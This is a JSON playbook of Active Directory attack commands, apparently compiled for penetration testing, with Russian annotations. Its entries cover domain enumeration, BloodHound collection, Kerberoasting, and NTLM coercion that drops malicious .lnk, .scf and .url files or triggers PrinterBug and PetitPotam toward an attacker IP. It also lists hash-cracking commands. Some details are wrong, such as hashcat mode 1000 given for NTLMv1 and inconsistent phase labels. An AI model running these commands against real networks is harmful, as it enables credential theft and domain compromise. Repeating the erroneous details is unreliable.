[
  {
    "condition": "Valid Credentials (cleartext creds, nt hash, kerberos ticket)",
    "attack_type": "Find all users",
    "tool": "GetADUsers.py",
    "req": "dc_ip, domain, username",
    "command": "GetADUsers.py -all -dc-ip <dc_ip> <domain>/<username>",
    "profit": "Username",
    "critical_note": "Используется для получения списка пользователей.",
    "kill_chain_phase": "RECON"
  },
  {
    "condition": "Valid Credentials (cleartext creds, nt hash, kerberos ticket)",
    "attack_type": "Find all users",
    "tool": "nxc smb",
    "req": "dc_ip, user, password",
    "command": "nxc smb <dc_ip> -u '<user>' -p '<password>' --users",
    "profit": "Username",
    "critical_note": "Перечисление пользователей через SMB.",
    "kill_chain_phase": "RECON"
  },
  {
    "condition": "Valid Credentials (cleartext creds, nt hash, kerberos ticket)",
    "attack_type": "Enumerate SMB share",
    "tool": "nxc smb",
    "req": "ip_range, user, password",
    "command": "nxc smb <ip_range> -u '<user>' -p '<password>' -M spider_plus",
    "profit": "Scroll shares",
    "critical_note": "Используется модуль spider_plus.",
    "kill_chain_phase": "RECON"
  },
  {
    "condition": "Valid Credentials (cleartext creds, nt hash, kerberos ticket)",
    "attack_type": "Enumerate SMB share",
    "tool": "nxc smb",
    "req": "ip_range, user, password",
    "command": "nxc smb <ip_range> -u '<user>' -p '<password>' --shares [--get-file \\\\<filename> <filename>]",
    "profit": "Scroll shares",
    "critical_note": "Базовое перечисление шар.",
    "kill_chain_phase": "RECON"
  },
  {
    "condition": "Valid Credentials (cleartext creds, nt hash, kerberos ticket)",
    "attack_type": "Enumerate SMB share",
    "tool": "manspider",
    "req": "ip_range, user, password, domain, file extensions",
    "command": "manspider <ip_range> -c passw -e <file extensions> -d <domain> -u <user> -p <password>",
    "profit": "Scroll shares",
    "critical_note": "Поиск чувствительных данных в файлах на шарах.",
    "kill_chain_phase": "RECON"
  },
  {
    "condition": "Valid Credentials (cleartext creds, nt hash, kerberos ticket)",
    "attack_type": "Bloodhound Legacy",
    "tool": "bloodhound-python",
    "req": "domain, user, password, dc_ip",
    "command": "bloodhound-python -d <domain> -u <user> -p <password> -gc <dc> -c all",
    "profit": "ACL, Delegation, Username",
    "critical_note": "Сбор данных для Bloodhound (Python версия).",
    "kill_chain_phase": "RECON"
  },
  {
    "condition": "Valid Credentials (cleartext creds, nt hash, kerberos ticket)",
    "attack_type": "Bloodhound Legacy",
    "tool": "rusthound",
    "req": "domain, user, password",
    "command": "rusthound -d <domain_to_enum> -u '<user>@<domain>' -p '<password>' -o <outfile.zip> -z",
    "profit": "ACL, Delegation, Username",
    "critical_note": "Альтернативный коллектор на Rust.",
    "kill_chain_phase": "RECON"
  },
  {
    "condition": "Valid Credentials (cleartext creds, nt hash, kerberos ticket)",
    "attack_type": "Bloodhound Legacy",
    "tool": "Sharphound.ps1",
    "req": "domain",
    "command": "import-module sharphound.ps1; invoke-bloodhound -collectionmethod all -domain <domain>",
    "profit": "ACL, Delegation, Username",
    "critical_note": "PowerShell версия коллектора.",
    "kill_chain_phase": "RECON"
  },
  {
    "condition": "Valid Credentials (cleartext creds, nt hash, kerberos ticket)",
    "attack_type": "Bloodhound Legacy",
    "tool": "Sharphound.exe",
    "req": "domain",
    "command": "sharphound.exe -c all -d <domain>",
    "profit": "ACL, Delegation, Username",
    "critical_note": "Исполняемый файл коллектора.",
    "kill_chain_phase": "RECON"
  },
  {
    "condition": "Valid Credentials (cleartext creds, nt hash, kerberos ticket)",
    "attack_type": "Bloodhound CE",
    "tool": "bloodhound-python",
    "req": "domain, user, password, dc",
    "command": "bloodhound-python -d <domain> -u <user> -p <password> -gc <dc> -c all",
    "profit": "ACL, Delegation, Username",
    "critical_note": "Версия для Bloodhound Community Edition.",
    "kill_chain_phase": "RECON"
  },
  {
    "condition": "Valid Credentials (cleartext creds, nt hash, kerberos ticket)",
    "attack_type": "Bloodhound CE",
    "tool": "rusthound-ce",
    "req": "domain, user, password",
    "command": "rusthound-ce -d <domain_to_enum> -u '<user>@<domain>' -p '<password>' -o <outfile.zip> -z --ldap-filter=(objectGuid=*)",
    "profit": "ACL, Delegation, Username",
    "critical_note": "Rust коллектор адаптированный для CE.",
    "kill_chain_phase": "RECON"
  },
  {
    "condition": "Valid Credentials (cleartext creds, nt hash, kerberos ticket)",
    "attack_type": "Bloodhound CE",
    "tool": "Sharphound.exe",
    "req": "domain",
    "command": "sharphound.exe -c all -d <domain>",
    "profit": "ACL, Delegation, Username",
    "critical_note": "Стандартный коллектор.",
    "kill_chain_phase": "RECON"
  },
  {
    "condition": "Valid Credentials (cleartext creds, nt hash, kerberos ticket)",
    "attack_type": "Bloodhound CE",
    "tool": "SOAPHound.exe",
    "req": "cache.txt",
    "command": "SOAPHound.exe -c c:\\temp\\cache.txt --bhdump -o c:\\temp\\bloodhound-output --autosplit --threshold 900",
    "profit": "ACL, Delegation, Username",
    "critical_note": "Альтернативный инструмент сбора данных.",
    "kill_chain_phase": "CREDS"
  },
  {
    "condition": "Valid Credentials (cleartext creds, nt hash, kerberos ticket)",
    "attack_type": "Enumerate Ldap",
    "tool": "ldeep",
    "req": "user, password, domain, dc_ip",
    "command": "ldeep ldap -u <users> -p '<password>' -d <domain> -s ldap://<dc_ip> all <backup_folder>",
    "profit": "ACL, Delegation, Username",
    "critical_note": "LDAP перечисление через ldeep.",
    "kill_chain_phase": "RECON"
  },
  {
    "condition": "Valid Credentials (cleartext creds, nt hash, kerberos ticket)",
    "attack_type": "Enumerate Ldap",
    "tool": "ldapdomaindump.py",
    "req": "user, password, dc_ip",
    "command": "ldapdomaindump.py -u <user> -p <password> -o <dump_folder> ldap://<dc_ip>:389",
    "profit": "ACL, Delegation, Username",
    "critical_note": "Дамп информации домена через LDAP.",
    "kill_chain_phase": "RECON"
  },
  {
    "condition": "Valid Credentials (cleartext creds, nt hash, kerberos ticket)",
    "attack_type": "Enumerate Ldap",
    "tool": "ldapsearch-ad.py",
    "req": "dc_ip, domain, user, password",
    "command": "ldapsearch-ad.py -l <dc_ip> -d <domain> -u <user> -p '<password>' -o <output.log> -t all",
    "profit": "ACL, Delegation, Username",
    "critical_note": "Поиск по LDAP.",
    "kill_chain_phase": "RECON"
  },
  {
    "condition": "Valid Credentials (cleartext creds, nt hash, kerberos ticket)",
    "attack_type": "Enumerate DNS",
    "tool": "adidnsdump",
    "req": "domain, user, password, dc_ip",
    "command": "adidnsdump -u <domain>\\\\<user> -p \"<password>\" --print-zones <dc_ip>",
    "profit": "New targets (low hanging fruit)",
    "critical_note": "Дамп DNS записей AD.",
    "kill_chain_phase": "RECON"
  },
  {
    "condition": "Valid Credentials (cleartext creds, nt hash, kerberos ticket)",
    "attack_type": "Enumerate ADCS",
    "tool": "certify.exe",
    "req": "None",
    "command": "certify.exe find",
    "profit": "ADCS Exploitation",
    "critical_note": "Поиск уязвимых шаблонов сертификатов.",
    "kill_chain_phase": "RECON"
  },
  {
    "condition": "Valid Credentials (cleartext creds, nt hash, kerberos ticket)",
    "attack_type": "Enumerate ADCS",
    "tool": "certipy",
    "req": "user, domain, password, dc_ip",
    "command": "certipy find -u <user>@<domain> -p '<password>' -dc-ip <dc_ip>",
    "profit": "ADCS Exploitation",
    "critical_note": "Python инструмент для аудита AD CS.",
    "kill_chain_phase": "RECON"
  },
  {
    "condition": "Valid Credentials (cleartext creds, nt hash, kerberos ticket)",
    "attack_type": "Enumerate SCCM",
    "tool": "sccmhunter.py",
    "req": "user, password, domain, dc_ip",
    "command": "sccmhunter.py find -u <user> -p <password> -d <domain> -dc-ip <dc_ip> -debug",
    "profit": "SCCM Exploitation",
    "critical_note": "Поиск серверов SCCM.",
    "kill_chain_phase": "RECON"
  },
  {
    "condition": "Valid Credentials (cleartext creds, nt hash, kerberos ticket)",
    "attack_type": "Enumerate SCCM",
    "tool": "ldeep",
    "req": "user, password, domain, dc_ip",
    "command": "ldeep ldap -u <user> -p <password> -d <domain> -s ldap://<dc_ip> sccm",
    "profit": "SCCM Exploitation",
    "critical_note": "Поиск SCCM через LDAP.",
    "kill_chain_phase": "RECON"
  },
  {
    "condition": "Valid Credentials (cleartext creds, nt hash, kerberos ticket)",
    "attack_type": "Enumerate SCCM",
    "tool": "SharpSCCM.exe",
    "req": "None",
    "command": "SharpSCCM.exe local site-info",
    "profit": "SCCM Exploitation",
    "critical_note": "Локальный сбор информации о сайте SCCM.",
    "kill_chain_phase": "RECON"
  },
  {
    "condition": "Valid Credentials (cleartext creds, nt hash, kerberos ticket)",
    "attack_type": "Scan Auto",
    "tool": "AD-miner",
    "req": "BH result, neo4j_username, neo4j_password",
    "command": "AD-miner -c -cf Report -u <neo4j_username> -p <neo4j_password>",
    "profit": "Report",
    "critical_note": "Анализ на основе данных BloodHound.",
    "kill_chain_phase": "RECON"
  },
  {
    "condition": "Valid Credentials (cleartext creds, nt hash, kerberos ticket)",
    "attack_type": "Scan Auto",
    "tool": "PingCastle.exe",
    "req": "domain",
    "command": "PingCastle.exe --healthcheck --server <domain>",
    "profit": "Report",
    "critical_note": "Автоматизированный аудит безопасности AD.",
    "kill_chain_phase": "RECON"
  },
  {
    "condition": "Valid Credentials (cleartext creds, nt hash, kerberos ticket)",
    "attack_type": "Scan Auto",
    "tool": "adPEAS.ps1",
    "req": "domain, dc_fqdn",
    "command": "Import-Module .\\adPEAS.ps1; Invoke-adPEAS -Domain '<domain>' -Server '<dc_fqdn>'",
    "profit": "Report",
    "critical_note": "Скрипт перечисления (аналог WinPEAS для AD).",
    "kill_chain_phase": "RECON"
  },
  {
    "condition": "Valid Credentials (cleartext creds, nt hash, kerberos ticket)",
    "attack_type": "Kerberoasting",
    "tool": "Cypher Query",
    "req": "Neo4j database",
    "command": "MATCH (u:User) WHERE u.hasspn=true AND u.enabled = true AND NOT u.objectid ENDS WITH '-502' AND NOT COALESCE(u.gmsa, false) = true AND NOT COALESCE(u.msa, false) = true RETURN u",
    "profit": "Hash TGS",
    "critical_note": "Запрос к базе Bloodhound для поиска пользователей с SPN.",
    "kill_chain_phase": "CREDS"
  },
  {
    "condition": "Valid Credentials (cleartext creds, nt hash, kerberos ticket)",
    "attack_type": "Kerberoasting",
    "tool": "GetUserSPNs.py",
    "req": "dc_ip, domain, user, password",
    "command": "GetUserSPNs.py -request -dc-ip <dc_ip> <domain>/<user>:<password>",
    "profit": "Hash TGS",
    "critical_note": "Запрос TGS билетов для Kerberoasting (Impacket).",
    "kill_chain_phase": "RECON"
  },
  {
    "condition": "Valid Credentials (cleartext creds, nt hash, kerberos ticket)",
    "attack_type": "Kerberoasting",
    "tool": "Rubeus.exe",
    "req": "None",
    "command": "Rubeus.exe kerberoast",
    "profit": "Hash TGS",
    "critical_note": "Инструмент для работы с Kerberos на C#.",
    "kill_chain_phase": "CREDS"
  },
  {
    "condition": "Valid Credentials (cleartext creds, nt hash, kerberos ticket)",
    "attack_type": "Coerce (Drop file .lnk)",
    "tool": "nxc smb",
    "req": "dc_ip, user, password, filename, attacker_ip",
    "command": "nxc smb <dc_ip> -u '<user>' -p '<password>' -M slinky -o NAME=<filename> SERVER=<attacker_ip>",
    "profit": "SMB Auth",
    "critical_note": "Создание вредоносного .lnk файла.",
    "kill_chain_phase": "ACCESS"
  },
  {
    "condition": "Valid Credentials (cleartext creds, nt hash, kerberos ticket)",
    "attack_type": "Coerce (Drop file .scf)",
    "tool": "nxc smb",
    "req": "dc_ip, user, password, filename, attacker_ip",
    "command": "nxc smb <dc_ip> -u '<user>' -p '<password>' -M sucffy -o NAME=<filename> SERVER=<attacker_ip>",
    "profit": "SMB Auth",
    "critical_note": "Создание вредоносного .scf файла.",
    "kill_chain_phase": "ACCESS"
  },
  {
    "condition": "Valid Credentials (cleartext creds, nt hash, kerberos ticket)",
    "attack_type": "Coerce (Drop file .url)",
    "tool": "Manual / Script",
    "req": "attacker_ip",
    "command": "[InternetShortcut]... IconFile=\\\\<attacker_ip>\\%USERNAME%.icon",
    "profit": "SMB Auth",
    "critical_note": "Содержимое .url файла для принудительной аутентификации.",
    "kill_chain_phase": "ACCESS"
  },
  {
    "condition": "Valid Credentials (cleartext creds, nt hash, kerberos ticket)",
    "attack_type": "Coerce (Drop other files)",
    "tool": "ntlm_theft.py",
    "req": "your_ip",
    "command": "ntlm_theft.py -g all -s <your_ip> -f test",
    "profit": "SMB Auth",
    "critical_note": "Генерация различных типов файлов для кражи NTLM хешей.",
    "kill_chain_phase": "ACCESS"
  },
  {
    "condition": "Valid Credentials (cleartext creds, nt hash, kerberos ticket)",
    "attack_type": "Coerce (Webdav)",
    "tool": "nxc smb",
    "req": "dc_ip, user, password",
    "command": "nxc smb <dc_ip> -u '<user>' -p '<password>' -M drop-sc",
    "profit": "Enable webclient / .searchConnector-ms",
    "critical_note": "Подготовка Webdav: создание .searchConnector-ms.",
    "kill_chain_phase": "RECON"
  },
  {
    "condition": "Valid Credentials (cleartext creds, nt hash, kerberos ticket)",
    "attack_type": "Coerce (Webdav)",
    "tool": "dnstool.py",
    "req": "domain, user, pass, attack_name, attacker_ip, dc_ip",
    "command": "dnstool.py -u <domain>\\<user> -p <pass> --record <attack_name> --action add --data <ip_attacker> <dc_ip>",
    "profit": "HTTP Coerce",
    "critical_note": "Добавление записи DNS для атаки, далее следует принуждение по HTTP.",
    "kill_chain_phase": "RECON"
  },
  {
    "condition": "Valid Credentials (cleartext creds, nt hash, kerberos ticket)",
    "attack_type": "Coerce (RPC call)",
    "tool": "printerbug.py",
    "req": "domain, username, password, printer_ip, listener_ip",
    "command": "printerbug.py <domain>/<username>:<password>@<printer_ip> <listener_ip>",
    "profit": "SMB NTLM Coerce",
    "critical_note": "Атака PrinterBug.",
    "kill_chain_phase": "RECON"
  },
  {
    "condition": "Valid Credentials (cleartext creds, nt hash, kerberos ticket)",
    "attack_type": "Coerce (RPC call)",
    "tool": "petitpotam.py",
    "req": "domain, user, password, listener_ip, target_ip",
    "command": "petitpotam.py -d <domain> -u <user> -p <password> <listener_ip> <target_ip>",
    "profit": "SMB NTLM Coerce",
    "critical_note": "Атака PetitPotam.",
    "kill_chain_phase": "RECON"
  },
  {
    "condition": "Valid Credentials (cleartext creds, nt hash, kerberos ticket)",
    "attack_type": "Coerce (RPC call)",
    "tool": "coercer.py",
    "req": "domain, user, password, target, attacker_ip",
    "command": "coercer.py -d <domain> -u <user> -p <password> -t <target> -l <attacker_ip>",
    "profit": "SMB NTLM Coerce",
    "critical_note": "Автоматизированный инструмент для различных методов принуждения.",
    "kill_chain_phase": "RECON"
  },
  {
    "condition": "Valid Credentials (cleartext creds, nt hash, kerberos ticket)",
    "attack_type": "Coerce kerberos (Step 1)",
    "tool": "dnstool.py",
    "req": "domain, user, password, attacker_ip, dns_server_ip, servername",
    "command": "dnstool.py -u \"<domain>\\<user>\" -p '<password>' -d \"<attacker_ip>\" --action add \"dns_server_ip\" -r \"<servername>1UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAYBAAAA\" --tcp",
    "profit": "Prepare DNS",
    "critical_note": "Подготовка DNS записи для Kerberos coercion (CVE-2022-26923 related techniques).",
    "kill_chain_phase": "RECON"
  },
  {
    "condition": "Valid Credentials (cleartext creds, nt hash, kerberos ticket)",
    "attack_type": "Coerce kerberos (Step 2)",
    "tool": "petitpotam.py",
    "req": "user, password, domain, servername, target",
    "command": "petitpotam.py -u '<user>' -p '<password>' -d <domain> '<servername>1UWh...' <target>",
    "profit": "SMB Kerberos coerce",
    "critical_note": "Исполнение атаки после подготовки DNS.",
    "kill_chain_phase": "RECON"
  },
  {
    "condition": "Valid Credentials (cleartext creds, nt hash, kerberos ticket)",
    "attack_type": "Intra ID Connect",
    "tool": "nxc ldap",
    "req": "dc_ip, user, password",
    "command": "nxc ldap <dc_ip> -u '<user>' -p '<password>' -M get-desc-users |grep -i MSOL",
    "profit": "Find MSOL",
    "critical_note": "Поиск учетных записей MSOL через описание пользователей.",
    "kill_chain_phase": "RECON"
  },
  {
    "condition": "Valid Credentials (cleartext creds, nt hash, kerberos ticket)",
    "attack_type": "Crack hash (NT)",
    "tool": "John the Ripper",
    "req": "hash.txt (NT hash), wordlist (rockyou.txt)",
    "command": "john --format=nt hash.txt --wordlist=<rockyou.txt>",
    "profit": "Cleartext Password",
    "critical_note": "Пример хеша: b4b9b02e6f09a9bd760...",
    "kill_chain_phase": "ACCESS"
  },
  {
    "condition": "Valid Credentials (cleartext creds, nt hash, kerberos ticket)",
    "attack_type": "Crack hash (NT)",
    "tool": "Hashcat",
    "req": "hash.txt (NT hash), wordlist (rockyou.txt)",
    "command": "hashcat -m 1000 -a 0 hash.txt <rockyou.txt>",
    "profit": "Cleartext Password",
    "critical_note": "Mode 1000. Пример хеша: b4b9b02e6f09a9bd760...",
    "kill_chain_phase": "ACCESS"
  },
  {
    "condition": "Valid Credentials (cleartext creds, nt hash, kerberos ticket)",
    "attack_type": "Crack hash (NTLMv1)",
    "tool": "John the Ripper",
    "req": "hash.txt (NTLMv1), wordlist (rockyou.txt)",
    "command": "john --format=netntlm hash.txt --wordlist=<rockyou.txt>",
    "profit": "Cleartext Password",
    "critical_note": "Пример: user::85D5BC...",
    "kill_chain_phase": "ACCESS"
  },
  {
    "condition": "Valid Credentials (cleartext creds, nt hash, kerberos ticket)",
    "attack_type": "Crack hash (NTLMv1)",
    "tool": "Hashcat",
    "req": "hash.txt (NTLMv1), wordlist (rockyou.txt)",
    "command": "hashcat -m 1000 -a 0 hash.txt <rockyou.txt>",
    "profit": "Cleartext Password",
    "critical_note": "Согласно схеме используется Mode 1000. Альтернативный инструмент: crack.sh",
    "kill_chain_phase": "ACCESS"
  },
  {
    "condition": "Valid Credentials (cleartext creds, nt hash, kerberos ticket)",
    "attack_type": "Crack hash (NTLMv2)",
    "tool": "John the Ripper",
    "req": "hash.txt (NTLMv2), wordlist (rockyou.txt)",
    "command": "john --format=netntlmv2 hash.txt --wordlist=<rockyou.txt>",
    "profit": "Cleartext Password",
    "critical_note": "Пример: user::N46iSNek...",
    "kill_chain_phase": "ACCESS"
  },
  {
    "condition": "Valid Credentials (cleartext creds, nt hash, kerberos ticket)",
    "attack_type": "Crack hash (NTLMv2)",
    "tool": "Hashcat",
    "req": "hash.txt (NTLMv2), wordlist (rockyou.txt)",
    "command": "hashcat -m 5600 -a 0 hash.txt <rockyou.txt>",
    "profit": "Cleartext Password",
    "critical_note": "Mode 5600. Пример: user::N46iSNek...",
    "kill_chain_phase": "ACCESS"
  },
  {
    "condition": "Valid Credentials (cleartext creds, nt hash, kerberos ticket)",
    "attack_type": "Crack hash (Kerberos 5 TGS)",
    "tool": "John the Ripper",
    "req": "hash.txt (KRBSTGS), wordlist (rockyou.txt)",
    "command": "john --format=krb5tgs hash.txt --wordlist=<rockyou.txt>",
    "profit": "Cleartext Password",
    "critical_note": "Пример: $krb5tgs$23$...",
    "kill_chain_phase": "ACCESS"
  }
]